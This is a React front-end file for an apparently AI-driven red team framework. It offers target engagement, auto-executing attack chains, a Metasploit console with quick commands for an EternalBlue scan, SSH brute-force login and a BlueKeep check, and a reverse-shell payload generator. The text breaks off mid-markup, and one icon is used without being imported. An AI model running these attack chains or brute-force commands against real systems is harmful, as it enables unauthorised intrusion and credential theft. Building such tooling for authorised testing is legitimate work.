import { useState, useEffect, useCallback, useRef } from "react";
import axios from "axios";
import { motion, AnimatePresence } from "framer-motion";
import {
  LayoutDashboard, Crosshair, GitBranch, Link, Brain, Terminal,
  Play, Square, Plus, Trash2, RefreshCw, ChevronRight, CheckCircle,
  Zap, Shield, Eye, Activity, Lock, Globe, Copy,
  Download, Search, Clock, AlertTriangle, Target,
  Settings, Save, Package
} from "lucide-react";
import { ScrollArea } from "./components/ui/scroll-area";
import { Progress } from "./components/ui/progress";
import "./App.css";

const API = process.env.REACT_APP_BACKEND_URL ? `${process.env.REACT_APP_BACKEND_URL}/api` : "/api";

function App() {
  // Navigation
  const [activeSection, setActiveSection] = useState("dashboard");

  // Core state
  const [target, setTarget] = useState("");
  const [targets, setTargets] = useState([]);
  const [selectedPhases, setSelectedPhases] = useState(["reconnaissance"]);
  const [isScanning, setIsScanning] = useState(false);
  const [currentScanId, setCurrentScanId] = useState(null);
  const [currentJobId, setCurrentJobId] = useState(null);
  const [scanStatus, setScanStatus] = useState(null);
  const [attackTree, setAttackTree] = useState(null);
  const [history, setHistory] = useState([]);
  const [terminalLines, setTerminalLines] = useState([{ type: "info", text: "RED TEAM FRAMEWORK v7.0 // AI-DRIVEN // SQLite + Jobs", time: new Date() }]);
  const [logFilter, setLogFilter] = useState("all");
  const [jobLogs, setJobLogs] = useState([]);

  // Tools
  const [mitreTactics, setMitreTactics] = useState([]);

  // MSF CLI
  const [msfCmd, setMsfCmd] = useState("");
  const [msfExecuting, setMsfExecuting] = useState(false);
  const [msfResult, setMsfResult] = useState(null);

  // Chains
  const [attackChains, setAttackChains] = useState([]);
  const [selectedChain, setSelectedChain] = useState(null);
  const [chainExecution, setChainExecution] = useState(null);
  const [chainContext, setChainContext] = useState({ lhost: "", domain: "", user: "", pass: "" });
  const [chainPolling, setChainPolling] = useState(false);
  const [suggestedChains, setSuggestedChains] = useState([]);

  // C2 — replaced by MSF CLI + tool status
  const [toolStatus, setToolStatus] = useState(null);

  // AI
  const [aiAnalysis, setAiAnalysis] = useState(null);

  // Global config
  const [globalConfig, setGlobalConfig] = useState({ listener_ip: "", listener_port: 4444, c2_protocol: "tcp", operator_name: "operator", stealth_mode: false, auto_lhost: true });
  const [configSaving, setConfigSaving] = useState(false);

  // Payloads
  const [payloadTemplates, setPayloadTemplates] = useState([]);
  const [generatedPayload, setGeneratedPayload] = useState(null);
  const [payloadFilter, setPayloadFilter] = useState("all");

  // Refs
  const pollIntervalRef = useRef(null);
  const chainPollRef = useRef(null);
  const terminalRef = useRef(null);

  // Terminal helper
  const addLog = useCallback((type, text) => {
    setTerminalLines(prev => [...prev.slice(-200), { type, text, time: new Date() }]);
  }, []);

  // Auto-scroll terminal
  useEffect(() => {
    if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
  }, [terminalLines]);

  // Load initial data
  useEffect(() => {
    const load = async () => {
      try {
        const [tacticsRes, chainsRes, historyRes, configRes] = await Promise.all([
          axios.get(`${API}/mitre/tactics`),
          axios.get(`${API}/chains`),
          axios.get(`${API}/scan/history`),
          axios.get(`${API}/config`)
        ]);
        const tacticsObj = tacticsRes.data.tactics || {};
        setMitreTactics(Object.entries(tacticsObj).map(([phase, data]) => ({ phase, ...data })));
        setAttackChains(chainsRes.data.chains || []);
        setHistory(historyRes.data || []);
        if (configRes.data) {
          setGlobalConfig(configRes.data);
          if (configRes.data.listener_ip) {
            setChainContext(prev => ({ ...prev, lhost: configRes.data.listener_ip }));
          }
        }
      } catch (e) { addLog("error", `Init error: ${e.message}`); }
    };
    load();
  }, [addLog]);

  // Dashboard stats
  const stats = {
    activeTargets: targets.filter(t => t.status === "scanning").length,
    compromised: targets.filter(t => t.status === "exploited").length,
    sessions: scanStatus?.vault_summary?.sessions || 0,
    totalScans: history.length,
  };

  // Scan functions
  const startScan = async () => {
    if (!target.trim()) return;
    setIsScanning(true);
    setJobLogs([]);
    addLog("cmd", `ENGAGE >> ${target}`);
    try {
      const res = await axios.post(`${API}/scan/start`, { target, scan_phases: selectedPhases, tools: [] });
      setCurrentScanId(res.data.scan_id);
      setCurrentJobId(res.data.job_id);
      addLog("success", `OP-ID: ${res.data.scan_id} | JOB: ${res.data.job_id}`);

      // Add to targets
      setTargets(prev => {
        const existing = prev.find(t => t.target === target);
        if (existing) return prev.map(t => t.target === target ? { ...t, status: "scanning", scanId: res.data.scan_id } : t);
        return [...prev, { target, status: "scanning", scanId: res.data.scan_id, addedAt: new Date().toISOString() }];
      });

      pollIntervalRef.current = setInterval(() => pollScan(res.data.scan_id, res.data.job_id), 2000);
    } catch (e) { addLog("error", e.message); setIsScanning(false); }
  };

  const pollScan = async (scanId, jobId) => {
    try {
      const res = await axios.get(`${API}/scan/${scanId}/status`);
      setScanStatus(res.data);

      if (res.data.current_tool) addLog("info", `[${res.data.current_tool}] ${res.data.progress}%`);

      // Show AI decisions in real-time
      const decisions = res.data.ai_decisions || [];
      if (decisions.length > 0) {
        const last = decisions[decisions.length - 1];
        if (last.reasoning && last.source === "ai") {
          addLog("warning", `[AI] ${last.reasoning}`);
        }
      }

      if (res.data.status === "completed") {
        clearInterval(pollIntervalRef.current);
        setIsScanning(false);
        setCurrentJobId(null);
        addLog("success", "SCAN COMPLETE");
        setAttackTree(res.data.attack_tree);
        setAiAnalysis(res.data.ai_analysis);

        setTargets(prev => prev.map(t => t.scanId === scanId ? { ...t, status: "exploited", results: res.data } : t));

        if (res.data.vault_summary) {
          const v = res.data.vault_summary;
          addLog("info", `[VAULT] Creds:${v.total_credentials||0} Sessions:${v.sessions||0}`);
        }
      } else if (res.data.status === "error") {
        clearInterval(pollIntervalRef.current);
        setIsScanning(false);
        setCurrentJobId(null);
        addLog("error", "SCAN FAILED");
      }
    } catch (e) { /* polling error, will retry */ }
  };

  const abortScan = async () => {
    if (currentScanId) {
      try { await axios.post(`${API}/scan/${currentScanId}/abort`); } catch (e) {}
    }
    if (currentJobId) {
      try { await axios.post(`${API}/jobs/${currentJobId}/cancel`); } catch (e) {}
    }
    clearInterval(pollIntervalRef.current);
    setIsScanning(false);
    setCurrentJobId(null);
    setJobLogs([]);
    addLog("error", "SCAN ABORTED");
  };

  // Chain functions
  const loadChainDetail = async (chainId) => {
    try {
      const res = await axios.get(`${API}/chains/${chainId}`);
      setSelectedChain({ id: chainId, ...res.data });
      setChainExecution(null);
    } catch (e) { addLog("error", e.message); }
  };

  const executeChainAuto = async () => {
    if (!selectedChain || !target) return;
    addLog("cmd", `CHAIN AUTO-EXECUTE: ${selectedChain.name}`);
    try {
      const res = await axios.post(`${API}/chains/execute`, { scan_id: currentScanId || "", chain_id: selectedChain.id, target, context: chainContext, auto_execute: true });
      setChainExecution(res.data);
      setChainPolling(true);
      chainPollRef.current = setInterval(async () => {
        try {
          const r = await axios.get(`${API}/chains/execution/${res.data.execution_id || res.data.id}`);
          setChainExecution(r.data);
          if (r.data.status === "completed") { clearInterval(chainPollRef.current); setChainPolling(false); addLog("success", "CHAIN COMPLETE"); }
        } catch (e) {}
      }, 1500);
    } catch (e) { addLog("error", e.message); }
  };

  const executeChainStep = async (execId, stepId) => {
    try {
      const res = await axios.post(`${API}/chains/execution/${execId}/step/${stepId}`);
      addLog("success", `Step ${stepId}: ${res.data.status}`);
      const statusRes = await axios.get(`${API}/chains/execution/${execId}`);
      setChainExecution(statusRes.data);
    } catch (e) { addLog("error", e.message); }
  };

  // C2 functions
  const loadToolStatus = async () => {
    try {
      const res = await axios.get(`${API}/health`);
      setToolStatus(res.data.checks);
    } catch (e) { addLog("error", e.message); }
  };

  const runMsfCommand = async () => {
    if (!msfCmd.trim()) return;
    setMsfExecuting(true);
    addLog("cmd", `MSF > ${msfCmd}`);
    try {
      const res = await axios.post(`${API}/msf/run`, { commands: msfCmd, timeout: 120 });
      setMsfResult(res.data);
      addLog(res.data.success ? "success" : "info", `MSF: ${res.data.success ? "Session opened!" : "Completed"}`);
    } catch (e) { addLog("error", e.message); }
    setMsfExecuting(false);
  };

  // Save global config
  const saveConfig = async () => {
    setConfigSaving(true);
    try {
      const res = await axios.put(`${API}/config`, globalConfig);
      if (res.data.config) setGlobalConfig(res.data.config);
      addLog("success", `CONFIG SAVED: LHOST=${globalConfig.listener_ip}:${globalConfig.listener_port}`);
      // Auto-update chain context
      if (globalConfig.listener_ip) {
        setChainContext(prev => ({ ...prev, lhost: globalConfig.listener_ip }));
      }
    } catch (e) { addLog("error", `Config save failed: ${e.message}`); }
    setConfigSaving(false);
  };

  // Load payload templates
  const loadPayloads = async () => {
    try {
      const res = await axios.get(`${API}/payloads/templates`);
      setPayloadTemplates(res.data.payloads || []);
    } catch (e) { addLog("error", `Payload load error: ${e.message}`); }
  };

  // Generate payload
  const generatePayload = async (payloadId) => {
    try {
      const res = await axios.post(`${API}/payloads/generate`, { payload_id: payloadId });
      setGeneratedPayload(res.data);
      addLog("success", `PAYLOAD GENERATED: ${res.data.name} [${res.data.lhost}:${res.data.lport}]`);
    } catch (e) { addLog("error", e.response?.data?.detail || e.message); }
  };

  // Filtered logs
  const filteredLogs = logFilter === "all" ? terminalLines : terminalLines.filter(l => l.type === logFilter);

  // NAV ITEMS
  const navItems = [
    { id: "dashboard", icon: LayoutDashboard, label: "Dashboard" },
    { id: "targets", icon: Crosshair, label: "Targets" },
    { id: "graph", icon: GitBranch, label: "Attack Graph" },
    { id: "chains", icon: Link, label: "Chains" },
    { id: "msf", icon: Terminal, label: "MSF CLI" },
    { id: "payloads", icon: Package, label: "Payloads" },
    { id: "ai", icon: Brain, label: "AI Engine" },
    { id: "config", icon: Settings, label: "Config" },
    { id: "logs", icon: Terminal, label: "Logs" },
  ];

  return (
    <div className="h-screen w-screen flex overflow-hidden" style={{ background: "var(--bg-base)" }}>
      {/* SIDEBAR */}
      <div className="w-52 flex-shrink-0 border-r border-[rgba(0,255,65,0.15)] flex flex-col" style={{ background: "var(--bg-panel)" }}>
        {/* Logo */}
        <div className="p-4 border-b border-[rgba(0,255,65,0.15)]">
          <div className="flex items-center gap-2">
            <Shield size={20} className="text-[#FF003C]" />
            <div>
              <div className="text-xs font-bold tracking-[0.2em] text-[#FF003C] uppercase">Red Team</div>
              <div className="text-[10px] text-[#2F4F38] tracking-wider">AI-DRIVEN v7.0</div>
            </div>
          </div>
        </div>

        {/* Nav */}
        <nav className="flex-1 py-2">
          {navItems.map(item => (
            <div key={item.id} onClick={() => { setActiveSection(item.id); if (item.id === "payloads" && payloadTemplates.length === 0) loadPayloads(); if (item.id === "msf") loadToolStatus(); }} className={`nav-item ${activeSection === item.id ? "active" : ""}`} data-testid={`nav-${item.id}`}>
              <item.icon size={14} />
              <span>{item.label}</span>
            </div>
          ))}
        </nav>

        {/* Autonomous Mode Toggle */}
        <div className="p-3 border-t border-[rgba(0,255,65,0.15)]">
          <div className="w-full py-3 text-xs font-bold tracking-[0.15em] uppercase text-center text-[#00FF41] border-t border-[rgba(0,255,65,0.1)]">
            <Brain size={14} className="inline mr-2" />AI-DRIVEN
          </div>
        </div>

        {/* Status */}
        <div className="p-3 border-t border-[rgba(0,255,65,0.15)] text-[10px] space-y-1">
          <div className="flex justify-between"><span className="text-[#2F4F38]">STATUS</span><span className={isScanning ? "text-[#FFB000]" : "text-[#00FF41]"}>{isScanning ? "ENGAGING" : "STANDBY"}</span></div>
          <div className="flex justify-between"><span className="text-[#2F4F38]">TARGETS</span><span>{targets.length}</span></div>
          <div className="flex justify-between"><span className="text-[#2F4F38]">SESSIONS</span><span>{stats.sessions}</span></div>
          <div className="flex justify-between"><span className="text-[#2F4F38]">LHOST</span><span className={globalConfig.listener_ip ? "text-[#00FF41]" : "text-[#FF003C]"}>{globalConfig.listener_ip || "NOT SET"}</span></div>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="flex-1 flex flex-col min-w-0">
        {/* Top Bar */}
        <div className="h-10 flex-shrink-0 border-b border-[rgba(0,255,65,0.15)] flex items-center px-4 gap-3" style={{ background: "var(--bg-panel)" }}>
          <input type="text" value={target} onChange={e => setTarget(e.target.value)} onKeyDown={e => e.key === "Enter" && !isScanning && startScan()} placeholder="TARGET (IP / DOMAIN / CIDR)" className="tac-input flex-1 text-xs h-7" data-testid="target-input" />
          {!isScanning ? (
            <button onClick={startScan} disabled={!target.trim()} className="tac-btn tac-btn-red h-7 text-[10px]" data-testid="start-scan-btn"><Play size={12} /> ENGAGE</button>
          ) : (
            <button onClick={abortScan} className="tac-btn tac-btn-red h-7 text-[10px]" data-testid="abort-scan-btn"><Square size={12} /> ABORT</button>
          )}
          {isScanning && <Progress value={scanStatus?.progress || 0} className="w-32 h-1 bg-[#0a140a]" />}
        </div>

        {/* Content Area + Terminal */}
        <div className="flex-1 flex min-h-0">
          {/* Main Panel */}
          <div className="flex-1 overflow-auto p-4 min-w-0">
            <AnimatePresence mode="wait">
              <motion.div key={activeSection} initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -8 }} transition={{ duration: 0.15 }}>

                {/* ===== DASHBOARD ===== */}
                {activeSection === "dashboard" && (
                  <div className="space-y-4" data-testid="dashboard-section">
                    <div className="grid grid-cols-4 gap-3">
                      {[
                        { label: "Active Targets", value: stats.activeTargets, color: "#FFB000" },
                        { label: "Compromised", value: stats.compromised, color: "#00FF41" },
                        { label: "Sessions", value: stats.sessions, color: "#00F0FF" },
                        { label: "Total Ops", value: stats.totalScans, color: "#8BBE95" },
                      ].map((m, i) => (
                        <div key={i} className="metric-card" data-testid={`metric-${m.label.toLowerCase().replace(/ /g, "-")}`}>
                          <div className="metric-value" style={{ color: m.color }}>{m.value}</div>
                          <div className="metric-label">{m.label}</div>
                        </div>
                      ))}
                    </div>

                    {/* MITRE Kill Chain Phase Selector */}
                    <div className="panel p-3">
                      <div className="panel-header mb-3" style={{ margin: "-12px -12px 12px", padding: "8px 12px" }}>
                        <h3>MITRE ATT&CK Kill Chain</h3>
                        <span className="text-[10px] text-[#2F4F38]">{selectedPhases.length} phases</span>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        {mitreTactics.map(tac => (
                          <button key={tac.id} onClick={() => setSelectedPhases(prev => prev.includes(tac.phase) ? prev.filter(p => p !== tac.phase) : [...prev, tac.phase])} className={`text-[10px] px-2 py-1 border transition-all ${selectedPhases.includes(tac.phase) ? "border-[#00FF41] text-[#00FF41] bg-[rgba(0,255,65,0.08)]" : "border-[rgba(0,255,65,0.15)] text-[#2F4F38] hover:text-[#8BBE95]"}`} data-testid={`phase-${tac.phase}`}>
                            {tac.name}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Recent Ops */}
                    <div className="panel">
                      <div className="panel-header"><h3>Recent Operations</h3><span className="text-[10px] text-[#2F4F38]">{history.length}</span></div>
                      <ScrollArea className="h-40 p-3">
                        {history.slice(-10).reverse().map((h, i) => (
                          <div key={i} className="flex items-center justify-between py-1 border-b border-[rgba(0,255,65,0.08)] last:border-0">
                            <span className="text-xs text-[#8BBE95] truncate flex-1">{h.target}</span>
                            <span className={`text-[10px] ${h.status === "completed" ? "text-[#00FF41]" : "text-[#FF003C]"}`}>{h.status}</span>
                          </div>
                        ))}
                        {history.length === 0 && <div className="text-[10px] text-[#2F4F38] text-center py-4">No operations yet</div>}
                      </ScrollArea>
                    </div>
                  </div>
                )}

                {/* ===== TARGETS ===== */}
                {activeSection === "targets" && (
                  <div className="space-y-3" data-testid="targets-section">
                    <div className="flex gap-2">
                      <input type="text" value={target} onChange={e => setTarget(e.target.value)} placeholder="Add target..." className="tac-input flex-1 text-xs" />
                      <button onClick={() => { if (target.trim()) { setTargets(prev => [...prev, { target, status: "idle", addedAt: new Date().toISOString() }]); setTarget(""); }}} className="tac-btn text-[10px]" data-testid="add-target-btn"><Plus size={12} /> ADD</button>
                    </div>
                    <div className="space-y-1">
                      {targets.map((t, i) => (
                        <div key={i} className="panel flex items-center gap-3 p-3">
                          <span className={`status-dot ${t.status}`} />
                          <span className="text-xs flex-1 truncate">{t.target}</span>
                          <span className="text-[10px] text-[#2F4F38] uppercase">{t.status}</span>
                          {t.status === "idle" && <button onClick={() => { setTarget(t.target); startScan(); }} className="tac-btn text-[10px]" data-testid={`scan-target-${i}`}><Play size={10} /></button>}
                          <button onClick={() => setTargets(prev => prev.filter((_, idx) => idx !== i))} className="text-[#FF003C] hover:text-[#FF003C]/80" data-testid={`remove-target-${i}`}><Trash2 size={12} /></button>
                        </div>
                      ))}
                      {targets.length === 0 && <div className="text-[10px] text-[#2F4F38] text-center py-8">No targets added. Enter a target above and click ADD.</div>}
                    </div>
                  </div>
                )}

                {/* ===== ATTACK GRAPH ===== */}
                {activeSection === "graph" && (
                  <div className="space-y-3" data-testid="graph-section">
                    <div className="panel" style={{ minHeight: "400px" }}>
                      <div className="panel-header"><h3>Attack Graph</h3></div>
                      <div className="p-4">
                        {attackTree ? (
                          <div className="space-y-2">
                            {(Array.isArray(attackTree.nodes) ? attackTree.nodes : Object.values(attackTree.nodes || {})).map((node, i) => (
                              <div key={i} className={`flex items-center gap-3 p-2 border transition-all cursor-pointer hover:bg-[#0C1A12] ${node.status === "success" ? "border-[#00FF41]/50" : node.status === "testing" ? "border-[#FFB000]/50" : node.status === "failed" ? "border-[#FF003C]/50" : "border-[rgba(0,255,65,0.15)]"}`} data-testid={`graph-node-${i}`}>
                                <span className={`status-dot ${node.status === "success" ? "active" : node.status === "testing" ? "scanning" : node.status === "failed" ? "offline" : "idle"}`} />
                                <div className="flex-1">
                                  <div className="text-xs font-bold" style={{ color: node.status === "success" ? "#00FF41" : node.status === "testing" ? "#FFB000" : node.status === "failed" ? "#FF003C" : "#8BBE95" }}>{node.name || node.tool}</div>
                                  <div className="text-[10px] text-[#2F4F38]">{node.type} {node.priority ? `// P${node.priority}` : ""}</div>
                                </div>
                                <span className="text-[10px] text-[#2F4F38] uppercase">{node.status}</span>
                              </div>
                            ))}
                          </div>
                        ) : (
                          <div className="text-center py-16 text-[#2F4F38] text-xs">Run a scan to generate the attack graph</div>
                        )}
                      </div>
                    </div>
                  </div>
                )}

                {/* ===== CHAINS ===== */}
                {activeSection === "chains" && (
                  <div className="space-y-3" data-testid="chains-section">
                    {selectedChain ? (
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <h3 className="text-xs font-bold tracking-[0.15em] uppercase text-[#FF003C]">{selectedChain.name}</h3>
                          <button onClick={() => { setSelectedChain(null); setChainExecution(null); if (chainPollRef.current) clearInterval(chainPollRef.current); }} className="text-[#2F4F38] hover:text-[#FF003C]" data-testid="chain-close-btn"><XCircle size={16} /></button>
                        </div>
                        <p className="text-[10px] text-[#8BBE95]">{selectedChain.description}</p>

                        {/* Context */}
                        <div className="grid grid-cols-4 gap-2">
                          {["lhost", "domain", "user", "pass"].map(f => (
                            <div key={f}>
                              <label className="text-[10px] text-[#2F4F38] uppercase">{f}</label>
                              <input type={f === "pass" ? "password" : "text"} value={chainContext[f]} onChange={e => setChainContext({ ...chainContext, [f]: e.target.value })} className="tac-input w-full text-xs mt-1" data-testid={`chain-${f}-input`} />
                            </div>
                          ))}
                        </div>

                        {/* Pipeline Progress */}
                        {chainExecution && (
                          <div className="panel p-3" data-testid="chain-execution-panel">
                            <div className="flex items-center justify-between mb-2">
                              <span className="text-[10px] text-[#FFB000] uppercase tracking-wider">{chainExecution.status}</span>
                              <span className="text-[10px] text-[#2F4F38]">{chainExecution.progress || 0}%</span>
                            </div>
                            <Progress value={chainExecution.progress || 0} className="h-1 bg-[#0a140a] mb-3" />
                            <div className="flex items-center gap-1 flex-wrap">
                              {(chainExecution.commands || chainExecution.steps || []).map((step, idx) => {
                                const ss = chainExecution.step_statuses?.[String(step.step_id || step.id)]?.status || "pending";
                                return (
                                  <span key={idx} className="flex items-center gap-1">
                                    <span className={`pipeline-step ${ss}`}>{step.step_name || step.name}</span>
                                    {idx < (chainExecution.commands || chainExecution.steps || []).length - 1 && <ChevronRight size={10} className="text-[#2F4F38]" />}
                                  </span>
                                );
                              })}
                            </div>
                          </div>
                        )}

                        {/* Steps */}
                        <ScrollArea className="h-48">
                          <div className="space-y-1">
                            {(selectedChain.steps || []).map(step => {
                              const ss = chainExecution?.step_statuses?.[String(step.id)]?.status || "pending";
                              return (
                                <div key={step.id} className={`panel p-2 ${ss === "running" ? "animate-pulse" : ""}`} style={{ borderColor: ss === "completed" ? "#00FF41" : ss === "running" ? "#FFB000" : ss === "failed" ? "#FF003C" : ss === "skipped" ? "#2F4F38" : undefined }} data-testid={`chain-step-${step.id}`}>
                                  <div className="flex items-center justify-between">
                                    <span className="text-[10px] font-bold" style={{ color: ss === "completed" ? "#00FF41" : ss === "running" ? "#FFB000" : ss === "skipped" ? "#2F4F38" : "#8BBE95" }}>S{step.id}: {step.name}</span>
                                    <div className="flex items-center gap-2">
                                      <span className="text-[10px] text-[#2F4F38] uppercase">{ss}</span>
                                      {chainExecution && ss === "pending" && !chainPolling && (
                                        <button onClick={() => executeChainStep(chainExecution.execution_id || chainExecution.id, step.id)} className="tac-btn text-[10px] py-0 px-2" data-testid={`exec-step-${step.id}`}>RUN</button>
                                      )}
                                    </div>
                                  </div>
                                  <div className="mt-1 space-y-0.5">
                                    {(step.actions || []).map((a, ai) => (
                                      <div key={ai} className="flex items-center gap-1 text-[10px]">
                                        <span className="text-[#2F4F38] bg-[#020302] px-1 py-0.5 flex-1 truncate font-mono">{a.tool && <span className="text-[#FFB000]">[{a.tool}] </span>}{a.cmd || a.module}</span>
                                        <button onClick={() => navigator.clipboard.writeText(a.cmd || a.module || "")} className="text-[#2F4F38] hover:text-[#00FF41]"><Copy size={9} /></button>
                                      </div>
                                    ))}
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        </ScrollArea>

                        {/* Actions */}
                        <div className="flex gap-2">
                          {!chainExecution ? (
                            <>
                              <button onClick={async () => {
                                try {
                                  const res = await axios.post(`${API}/chains/execute`, { scan_id: currentScanId || "", chain_id: selectedChain.id, target, context: chainContext, auto_execute: false });
                                  setChainExecution(res.data);
                                  addLog("success", `Chain prepared: ${res.data.total_steps} steps`);
                                } catch (e) { addLog("error", e.message); }
                              }} className="tac-btn flex-1 justify-center text-[10px]" disabled={!target} data-testid="prepare-chain-btn">PREPARE (MANUAL)</button>
                              <button onClick={executeChainAuto} className="tac-btn tac-btn-red flex-1 justify-center text-[10px]" disabled={!target} data-testid="auto-execute-chain-btn"><Zap size={12} /> AUTO-EXECUTE</button>
                            </>
                          ) : chainExecution.status === "completed" ? (
                            <div className="w-full p-2 border border-[#00FF41]/50 bg-[rgba(0,255,65,0.05)] text-center text-xs text-[#00FF41]"><CheckCircle size={14} className="inline mr-2" />CHAIN COMPLETE</div>
                          ) : chainExecution.status === "running" ? (
                            <div className="w-full p-2 border border-[#FFB000]/50 text-center text-xs text-[#FFB000]"><RefreshCw size={14} className="inline mr-2 animate-spin" />EXECUTING {chainExecution.current_step}/{chainExecution.total_steps}</div>
                          ) : (
                            <button onClick={executeChainAuto} className="tac-btn tac-btn-red w-full justify-center text-[10px]" data-testid="run-all-chain-btn"><Zap size={12} /> RUN ALL</button>
                          )}
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        {suggestedChains.length > 0 && (
                          <div className="mb-3">
                            <h4 className="text-[10px] uppercase tracking-wider text-[#FFB000] mb-2">Suggested (Based on Scan)</h4>
                            {suggestedChains.map((c, i) => (
                              <div key={i} onClick={() => loadChainDetail(c.id)} className="panel p-3 mb-1 cursor-pointer hover:border-[#FFB000]" data-testid={`suggested-chain-${c.id}`}>
                                <div className="flex items-center justify-between">
                                  <span className="text-xs text-[#FFB000] font-bold">{c.name}</span>
                                  <span className="text-[10px] text-[#2F4F38]">{c.total_steps} steps</span>
                                </div>
                                <p className="text-[10px] text-[#8BBE95]">{c.description}</p>
                              </div>
                            ))}
                          </div>
                        )}
                        <h4 className="text-[10px] uppercase tracking-wider text-[#2F4F38] mb-1">All Attack Chains</h4>
                        {attackChains.map(c => (
                          <div key={c.id} onClick={() => loadChainDetail(c.id)} className="panel p-3 cursor-pointer hover:border-[rgba(0,255,65,0.5)]" data-testid={`chain-card-${c.id}`}>
                            <div className="flex items-center justify-between">
                              <span className="text-xs text-[#FF003C] font-bold">{c.name}</span>
                              <span className="text-[10px] text-[#2F4F38]">{c.steps_count} steps</span>
                            </div>
                            <p className="text-[10px] text-[#8BBE95] mt-1">{c.description}</p>
                            <div className="flex gap-1 mt-1 flex-wrap">
                              {(c.triggers || []).map((t, ti) => <span key={ti} className="text-[10px] px-1 border border-[#FFB000]/30 text-[#FFB000]">{t}</span>)}
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}

                {/* ===== C2 ===== */}
                {activeSection === "msf" && (
                  <div className="space-y-3" data-testid="msf-section">
                    <h3 className="text-xs font-bold tracking-[0.15em] uppercase">Metasploit CLI</h3>
                    <p className="text-[10px] text-[#8BBE95]">Direct msfconsole commands — no msfrpcd needed</p>
                    <div className="flex gap-1">
                      <input type="text" value={msfCmd} onChange={e => setMsfCmd(e.target.value)} onKeyDown={e => e.key === "Enter" && runMsfCommand()} placeholder="use exploit/...; set RHOSTS ...; run" className="tac-input flex-1 text-xs font-mono" data-testid="msf-cmd-input" />
                      <button onClick={runMsfCommand} disabled={msfExecuting} className="tac-btn tac-btn-solid text-[10px]" data-testid="msf-cmd-run">{msfExecuting ? <RefreshCw size={12} className="animate-spin" /> : <Play size={12} />} {msfExecuting ? "RUNNING..." : "EXECUTE"}</button>
                    </div>
                    {msfResult && (
                      <div className="panel" data-testid="msf-result">
                        <div className="panel-header">
                          <span className={`text-[10px] ${msfResult.success ? "text-[#00FF41]" : "text-[#FFB000]"}`}>{msfResult.success ? "SESSION OPENED" : "COMPLETED"}</span>
                        </div>
                        <ScrollArea className="h-48 p-3">
                          <pre className="text-[10px] text-[#8BBE95] font-mono whitespace-pre-wrap">{msfResult.output || msfResult.error || "No output"}</pre>
                        </ScrollArea>
                      </div>
                    )}
                    <div className="panel">
                      <div className="panel-header"><h3 className="text-[10px]">Quick Commands</h3></div>
                      <div className="p-3 grid grid-cols-2 gap-2">
                        {[
                          { label: "EternalBlue Scan", cmd: "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {target}; run" },
                          { label: "SSH Brute", cmd: "use auxiliary/scanner/ssh/ssh_login; set RHOSTS {target}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; run" },
                          { label: "HTTP Dir Scan", cmd: "use auxiliary/scanner/http/dir_scanner; set RHOSTS {target}; run" },
                          { label: "BlueKeep Check", cmd: "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS {target}; run" },
                        ].map((q, i) => (
                          <button key={i} onClick={() => setMsfCmd(q.cmd.replace("{target}", target || "TARGET"))} className="tac-btn text-[10px] text-left" data-testid={`msf-quick-${i}`}>
                            {q.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* ===== PAYLOADS ===== */}
                {activeSection === "payloads" && (
                  <div className="space-y-3" data-testid="payloads-section">
                    <div className="flex items-center justify-between">
                      <h3 className="text-xs font-bold tracking-[0.15em] uppercase">Payload Generator</h3>
                      <div className="flex gap-2">
                        <span className={`text-[10px] px-2 py-1 border ${globalConfig.listener_ip ? "border-[#00FF41] text-[#00FF41]" : "border-[#FF003C] text-[#FF003C]"}`}>
                          LHOST: {globalConfig.listener_ip || "NOT SET"}:{globalConfig.listener_port}
                        </span>
                        <button onClick={loadPayloads} className="tac-btn text-[10px]" data-testid="refresh-payloads"><RefreshCw size={12} /></button>
                      </div>
                    </div>

                    {!globalConfig.listener_ip && (
                      <div className="panel p-3 border-[#FF003C]">
                        <div className="text-xs text-[#FF003C] flex items-center gap-2"><AlertTriangle size={14} /> LHOST no configurado. Ve a Config para establecer tu IP de VPS/listener.</div>
                      </div>
                    )}

                    {/* Filter */}
                    <div className="flex gap-1">
                      {["all", "windows", "linux", "oneliner", "implant"].map(f => (
                        <button key={f} onClick={() => setPayloadFilter(f)} className={`text-[10px] px-2 py-1 border uppercase ${payloadFilter === f ? "border-[#00FF41] text-[#00FF41]" : "border-[rgba(0,255,65,0.15)] text-[#2F4F38]"}`} data-testid={`payload-filter-${f}`}>{f}</button>
                      ))}
                    </div>

                    {/* Generated Payload Detail */}
                    {generatedPayload && (
                      <div className="panel p-4 border-[#00FF41]" data-testid="generated-payload-detail">
                        <div className="flex items-center justify-between mb-3">
                          <span className="text-xs text-[#00FF41] font-bold">{generatedPayload.name}</span>
                          <button onClick={() => setGeneratedPayload(null)} className="text-[#2F4F38] hover:text-[#FF003C]"><XCircle size={14} /></button>
                        </div>
                        <div className="space-y-2">
                          <div>
                            <span className="text-[10px] text-[#FFB000] uppercase block mb-1">Generator Command (run on your Kali)</span>
                            <div className="flex items-center gap-1">
                              <code className="text-[10px] text-[#00FF41] bg-[#020302] px-2 py-2 flex-1 font-mono break-all">{generatedPayload.generator_cmd}</code>
                              <button onClick={() => { navigator.clipboard.writeText(generatedPayload.generator_cmd); addLog("info", "Generator cmd copied"); }} className="text-[#2F4F38] hover:text-[#00FF41] flex-shrink-0"><Copy size={14} /></button>
                            </div>
                          </div>
                          <div>
                            <span className="text-[10px] text-[#FFB000] uppercase block mb-1">Handler (start BEFORE executing payload)</span>
                            <div className="flex items-center gap-1">
                              <code className="text-[10px] text-[#00F0FF] bg-[#020302] px-2 py-2 flex-1 font-mono break-all">{generatedPayload.handler_cmd}</code>
                              <button onClick={() => { navigator.clipboard.writeText(generatedPayload.handler_cmd); addLog("info", "Handler cmd copied"); }} className="text-[#2F4F38] hover:text-[#00FF41] flex-shrink-0"><Copy size={14} /></button>
                            </div>
                          </div>
                          {generatedPayload.payload_content && (
                            <div>
